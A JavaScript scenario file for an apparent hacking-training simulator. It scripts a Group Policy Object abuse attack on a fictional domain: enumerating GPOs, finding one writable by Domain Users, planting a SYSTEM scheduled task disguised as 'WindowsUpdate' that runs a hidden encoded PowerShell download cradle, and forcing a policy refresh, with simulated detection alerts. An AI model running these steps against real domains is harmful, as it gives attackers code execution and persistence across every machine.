export default {
  id: 'gpo-abuse',
  title: 'Group Policy Object Abuse',
  description: 'Exploit weak GPO permissions to gain domain-wide code execution by injecting malicious scheduled tasks into a writable Group Policy Object.',
  difficulty: 'Advanced',
  mitreAttack: 'T1484.001',
  network: {
    attacker: { hostname: 'KALI-ATTACK', ip: '10.0.0.5' },
    target: { hostname: 'DC01', ip: '10.0.1.10' },
    dc: { hostname: 'DC01', ip: '10.0.1.10' },
    domain: 'contoso.local'
  },
  steps: [
    {
      id: 0,
      description: 'Enumerate all Group Policy Objects in the domain to identify potential targets.',
      expectedCommand: 'Get-GPO -All',
      hintShort: 'Use PowerShell to list all GPOs in the domain',
      hintFull: 'Run: Get-GPO -All to enumerate Group Policy Objects',
      attackerOutput: [
        '',
        'DisplayName      : Default Domain Policy',
        'DomainName      : contoso.local',
        'Owner           : CONTOSO\\Domain Admins',
        'Id              : 31B2F340-016D-11D2-945F-00C04FB984F9',
        'GpoStatus       : AllSettingsEnabled',
        '',
        'DisplayName      : Default Domain Controllers Policy',
        'DomainName      : contoso.local',
        'Owner           : CONTOSO\\Domain Admins',
        'Id              : 6AC1786C-016F-11D2-945F-00C04fB984F9',
        'GpoStatus       : AllSettingsEnabled',
        '',
        'DisplayName      : Desktop Configuration',
        'DomainName      : contoso.local',
        'Owner           : CONTOSO\\IT Admins',
        'Id              : A8B42C6D-8E2F-4A3B-9C1D-E2F3A4B5C6D7',
        'GpoStatus       : AllSettingsEnabled',
        '',
        '[*] Found 3 GPOs in the domain'
      ],
      serverOutput: [
        '[LDAP] Query received: (&(objectClass=groupPolicyContainer))',
        '[LDAP] Returned 3 Group Policy Objects'
      ],
      delay: 150
    },
    {
      id: 1,
      description: 'Check permissions on GPOs to find one with weak access controls that we can modify.',
      expectedCommand: 'Get-GPPermission -Name "Desktop Configuration" -All',
      hintShort: 'Check who has permissions on the Desktop Configuration GPO',
      hintFull: 'Run: Get-GPPermission -Name "Desktop Configuration" -All',
      attackerOutput: [
        '',
        'Trustee       : CONTOSO\\Domain Users',
        'TrusteeType   : Group',
        'PermissionType: GpoEditDeleteModifySecurity',
        'Inherited     : False',
        '',
        'Trustee       : CONTOSO\\IT Admins',
        'TrusteeType   : Group',
        'PermissionType: GpoEditDeleteModifySecurity',
        'Inherited     : False',
        '',
        '[!] VULNERABLE: Domain Users have write permissions on this GPO!',
        '[*] Any domain user can modify this GPO affecting all computers'
      ],
      serverOutput: [
        '[LDAP] Query: GPO permissions for Desktop Configuration',
        '[SECURITY] ACL enumeration detected',
        '[WARNING] Unusual permission query pattern'
      ],
      delay: 150
    },
    {
      id: 2,
      description: 'Create a malicious scheduled task XML that will execute our payload when the GPO is applied.',
      expectedCommand: 'cat malicious-task.xml',
      hintShort: 'View the malicious scheduled task XML configuration',
      hintFull: 'Use cat to view the scheduled task XML file',
      lootToGrant: {
        files: {
          'malicious-task.xml': {
            content: `<?xml version="1.0" encoding="UTF-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
  <Task clsid="{2DBBF7C5-8E18-4e42-B92B-EE1AF82E0FE3}" name="WindowsUpdate" 
        image="0" changed="2024-11-15 05:00:00" uid="{A8B42C6D-8E2F-4A3B-9C1D}">
    <Properties action="C" name="WindowsUpdate" runAs="NT AUTHORITY\\SYSTEM" 
                logonType="S4U">
      <Task version="1.2">
        <Principals>
          <Principal id="Author">
            <UserId>NT AUTHORITY\\SYSTEM</UserId>
            <RunLevel>HighestAvailable</RunLevel>
          </Principal>
        </Principals>
        <Actions>
          <Exec>
            <Command>powershell.exe</Command>
            <Arguments>-NoP -W Hidden -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjA...</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </Task>
</ScheduledTasks>`
          }
        }
      },
      attackerOutput: [
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">',
        '  <Task clsid="{2DBBF7C5-8E18-4e42-B92B-EE1AF82E0FE3}" name="WindowsUpdate">',
        '    <Properties action="C" runAs="NT AUTHORITY\\SYSTEM">',
        '      <Actions>',
        '        <Exec>',
        '          <Command>powershell.exe</Command>',
        '          <Arguments>-NoP -W Hidden -Enc [Base64_Payload]</Arguments>',
        '        </Exec>',
        '      </Actions>',
        '    </Properties>',
        '  </Task>',
        '</ScheduledTasks>',
        '',
        '[*] Malicious scheduled task created',
        '[*] Will execute as SYSTEM on all computers linked to GPO'
      ],
      serverOutput: [],
      delay: 100
    },
    {
      id: 3,
      description: 'Upload the malicious scheduled task to the GPO via the SYSVOL share on the domain controller.',
      expectedCommand: 'copy malicious-task.xml \\\\DC01\\SYSVOL\\contoso.local\\Policies\\{A8B42C6D-8E2F-4A3B-9C1D}\\Machine\\Preferences\\ScheduledTasks\\',
      expectedCommands: [
        'copy malicious-task.xml \\\\DC01\\SYSVOL\\contoso.local\\Policies\\{A8B42C6D-8E2F-4A3B-9C1D}\\Machine\\Preferences\\ScheduledTasks\\',
        'cp malicious-task.xml \\\\DC01\\SYSVOL\\contoso.local\\Policies\\{A8B42C6D-8E2F-4A3B-9C1D}\\Machine\\Preferences\\ScheduledTasks\\'
      ],
      hintShort: 'Copy the malicious XML to the GPO folder on SYSVOL',
      hintFull: 'Use copy or cp to upload the file to the GPO ScheduledTasks directory',
      attackerOutput: [
        '',
        'Uploading malicious-task.xml to \\\\DC01\\SYSVOL...',
        '',
        '        1 file(s) copied.',
        '',
        '[✓] Successfully uploaded malicious scheduled task to GPO',
        '[*] File location: \\\\DC01\\SYSVOL\\contoso.local\\Policies\\{A8B42C6D}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml',
        '[*] Task will be deployed to all computers on next Group Policy refresh'
      ],
      serverOutput: [
        '[SMB] Connection from 10.0.0.5 to \\\\DC01\\SYSVOL',
        '[SMB] File write: Policies\\{A8B42C6D}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml',
        '[SECURITY] GPO modification detected',
        '[ALERT] Scheduled task added to Group Policy'
      ],
      delay: 200
    },
    {
      id: 4,
      description: 'Force Group Policy update on target computers to immediately deploy the malicious scheduled task.',
      expectedCommand: 'Invoke-GPUpdate -Computer "WORKSTATION01" -Force',
      hintShort: 'Force a Group Policy update on a target workstation',
      hintFull: 'Run: Invoke-GPUpdate -Computer "WORKSTATION01" -Force',
      attackerOutput: [
        '',
        'Updating Group Policy on WORKSTATION01...',
        '',
        'Computer Policy update has completed successfully.',
        'User Policy update has completed successfully.',
        '',
        '[✓] Group Policy refresh completed on WORKSTATION01',
        '[*] Malicious scheduled task now deployed',
        '[*] Task executes as SYSTEM at next scheduled interval'
      ],
      serverOutput: [
        '[GP] Policy refresh request from WORKSTATION01',
        '[GP] Downloading policies from SYSVOL',
        '[GP] Processing scheduled tasks from GPO {A8B42C6D}',
        '[GP] Creating scheduled task: WindowsUpdate',
        '[CRITICAL] Scheduled task created with SYSTEM privileges',
        '[DEFENSE] ALERT: Suspicious GPO-based scheduled task deployment detected!'
      ],
      delay: 250
    },
    {
      id: 5,
      description: 'Verify that the malicious scheduled task was successfully created on the target computer.',
      expectedCommand: 'Get-ScheduledTask -CimSession WORKSTATION01 | Where-Object {$_.TaskName -eq "WindowsUpdate"}',
      expectedCommands: [
        'Get-ScheduledTask -CimSession WORKSTATION01 | Where-Object {$_.TaskName -eq "WindowsUpdate"}',
        'schtasks /query /S WORKSTATION01 /TN WindowsUpdate'
      ],
      hintShort: 'Query the scheduled tasks on WORKSTATION01',
      hintFull: 'Use Get-ScheduledTask to verify the WindowsUpdate task exists',
      attackerOutput: [
        '',
        'TaskPath                          TaskName                State',
        '--------                          --------                -----',
        '\\                                 WindowsUpdate           Ready',
        '',
        'Task Information:',
        '  Author: NT AUTHORITY\\SYSTEM',
        '  Run Level: HighestAvailable',
        '  Status: Ready',
        '  Next Run Time: 11/15/2025 6:00:00 AM',
        '',
        '[✓] MISSION SUCCESS: Malicious scheduled task verified!',
        '[*] Payload will execute as SYSTEM on all domain computers',
        '[*] Persistence achieved via Group Policy Object',
        '',
        '═══════════════════════════════════════════════════════════',
        '  GPO ABUSE ATTACK COMPLETE',
        '═══════════════════════════════════════════════════════════',
        '  ✓ Enumerated GPOs',
        '  ✓ Identified weak permissions',
        '  ✓ Injected malicious scheduled task',
        '  ✓ Achieved domain-wide code execution',
        '═══════════════════════════════════════════════════════════'
      ],
      serverOutput: [
        '[WinRM] Connection from 10.0.0.5',
        '[SCHED] Task query: WindowsUpdate',
        '[SECURITY] Scheduled task enumeration from external host'
      ],
      delay: 150
    }
  ]
};
